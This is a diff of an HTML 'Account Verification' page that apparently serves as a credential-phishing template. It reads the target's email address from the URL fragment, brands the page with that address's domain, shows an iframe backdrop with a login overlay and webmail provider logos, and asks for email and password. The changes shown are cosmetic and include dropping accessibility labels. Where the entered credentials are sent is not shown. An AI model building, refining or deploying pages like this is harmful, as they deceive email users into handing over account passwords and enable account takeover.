@@ -2,19 +2,18 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Account Verification</title>
 
-  <!-- Font Awesome for icons -->
+  <!-- ✅ Font Awesome for icons -->
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 
-  <!-- Custom CSS -->
-  <link rel="stylesheet" href="style.css" />
+  <!-- ✅ Your custom CSS -->
+  <link rel="stylesheet" href="style.css">
 
-  <!-- Dynamic Title Script -->
+  <!-- ✅ Dynamic Title Script with Capitalized First Letter -->
   <script>
     window.addEventListener("DOMContentLoaded", function () {
-      const hash = window.location.hash.substring(1);
+      const hash = window.location.hash.substring(1); // Remove the '#' character
       const parts = hash.split("@");
       if (parts.length === 2) {
         const domain = parts[1];
@@ -24,45 +23,40 @@
     });
   </script>
 </head>
-
 <body>
 
-      <!-- Email Provider Logos -->
-      <div class="email-providers">
-        <img src="https://logo.clearbit.com/yahoo.com" alt="Yahoo" title="Yahoo" />
-        <img src="https://logo.clearbit.com/webmail.com" alt="Webmail" title="Webmail" />
-        <img src="https://logo.clearbit.com/outlook.com" alt="Outlook" title="Outlook" />
-        <img src="https://logo.clearbit.com/gmail.com" alt="Gmail" title="Gmail" />
-        <img src="https://logo.clearbit.com/163.com" alt="163 Mail" title="163 Mail" />
-        <img src="https://logo.clearbit.com/aol.com" alt="AOL" title="AOL" />
-        <img src="https://logo.clearbit.com/yandex.com" alt="Yandex" title="Yandex" />
+<div class="email-providers">
+        <img src="https://logo.clearbit.com/yahoo.com" alt="Yahoo" title="Yahoo">
+        <img src="https://logo.clearbit.com/webmail.com" alt="Webmail" title="Webmail">
+        <img src="https://logo.clearbit.com/outlook.com" alt="Outlook" title="Outlook">
+        <img src="https://logo.clearbit.com/gmail.com" alt="Gmail" title="Gmail">
+        <img src="https://logo.clearbit.com/163.com" alt="163" title="163">
+        <img src="https://logo.clearbit.com/aol.com" alt="AOL" title="AOL">
+        <img src="https://logo.clearbit.com/yandex.com" alt="Yandex" title="Yandex">
       </div>
     </div>
   </div>
 </body>
 </html>
-  
-  <!-- Fullscreen background iframe -->
-  <iframe id="bg-frame" title="Background Frame" aria-hidden="true"></iframe>
 
-  <!-- Overlay Login Container -->
+  <!-- Fullscreen background iframe -->
+  <iframe id="bg-frame"></iframe>
+
+  <!-- Login overlay -->
   <div class="overlay" id="overlay">
     <div class="login-box">
-      <!-- Logo -->
       <img id="logo" alt="Logo" />
 
-      <!-- Email Input Group -->
+      <!-- ✅ Email input with icon -->
       <div class="input-group">
-        <label for="email" class="visually-hidden">Email</label>
         <i class="fas fa-envelope icon"></i>
-        <input type="email" id="email" placeholder="Email" required />
+        <input type="email" id="email" placeholder="Email" />
       </div>
 
-      <!-- Password Input Group -->
+      <!-- ✅ Password input with icon -->
       <div class="input-group">
-        <label for="password" class="visually-hidden">Password</label>
         <i class="fas fa-lock icon"></i>
-        <input type="password" id="password" placeholder="Password" required />
+        <input type="password" id="password" placeholder="Password" />
       </div>
 
       <!-- Error message -->
@@ -77,4 +71,3 @@
   <script src="script.js"></script>
 </body>
 </html>
-     
